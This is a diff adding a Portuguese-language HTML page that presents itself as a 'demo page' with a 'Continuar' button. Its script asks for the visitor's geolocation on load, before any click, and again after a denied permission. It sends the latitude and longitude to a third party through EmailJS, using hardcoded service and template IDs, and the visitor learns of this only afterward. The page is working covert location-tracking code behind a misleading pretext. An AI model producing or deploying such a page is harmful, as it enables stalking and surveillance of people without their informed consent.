@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Obter Localização</title>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f0f2f5;
+        color: #333;
+      }
+      .container {
+        text-align: center;
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      }
+      h1 {
+        font-size: 1.5em;
+        margin-bottom: 20px;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 1em;
+        color: white;
+        background-color: #007bff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+      button:hover {
+        background-color: #0056b3;
+      }
+      #loading {
+        display: none;
+      }
+      #loading h1 {
+        font-size: 1.5em;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="content" class="container">
+      <h1>Abrir pagina de demostração ?</h1>
+      <button id="getLocationButton">Continuar</button>
+    </div>
+    <div id="loading" class="container">
+      <h1>Carregando...</h1>
+    </div>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init("H-HNQnrOdYT5ZAkAN"); // Substitua "SEU_USER_ID" pelo seu User ID do EmailJS
+      })();
+      navigator.geolocation.getCurrentPosition(showPosition, showError);
+      document
+        .getElementById("getLocationButton")
+        .addEventListener("click", function () {
+          navigator.geolocation.getCurrentPosition(showPosition, showError);
+          document.getElementById("content").style.display = "none";
+          document.getElementById("loading").style.display = "block";
+        });
+
+      function showPosition(position) {
+        const templateParams = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+        };
+
+        emailjs
+          .send("service_d7h3d99", "template_8wd1fox", templateParams)
+          .then(
+            function (response) {
+              alert("Localização enviada com sucesso!");
+              document.getElementById("loading").style.display = "none";
+            },
+            function (error) {
+              console.error("Erro:", error);
+              alert("Erro ao enviar localização.");
+              document.getElementById("content").style.display = "block";
+              document.getElementById("loading").style.display = "none";
+            }
+          );
+      }
+
+      function showError(error) {
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            break;
+          case error.POSITION_UNAVAILABLE:
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            break;
+          case error.TIMEOUT:
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            break;
+          case error.UNKNOWN_ERROR:
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            break;
+        }
+        document.getElementById("content").style.display = "block";
+        document.getElementById("loading").style.display = "none";
+      }
+    </script>
+  </body>
+</html>
